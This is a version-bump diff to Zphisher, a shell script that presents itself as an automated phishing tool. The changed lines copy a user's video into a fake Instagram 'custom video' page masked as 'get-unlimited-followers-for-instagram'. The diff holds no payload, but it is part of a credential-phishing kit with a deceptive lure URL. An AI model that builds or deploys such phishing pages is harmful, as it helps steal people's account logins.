@@ -2,7 +2,7 @@
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.3.5
+##   Version 	: 	2.3.6
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
@@ -89,7 +89,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.5"
+__version__="2.3.6"
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -575,10 +575,8 @@ cat <<- EOF
 	echo -e -n "${RED}[${WHITE}-${RED}]${GREEN} Write the path of the video : ${BLUE}"
 	read videoruta
 	cd .sites/instagram_video_custom/video
-	rm -rf *.mp4
-	cp ${videoruta} $(pwd)
-	mv *.mp4 video.mp4
-	echo
+	rm -rf *.mp4 
+	cp ${videoruta} .sites/instagram_video_custom/video 
         cd .. && cd .. && cd ..
 	website="instagram_video_custom"
         mask='http://get-unlimited-followers-for-instagram'
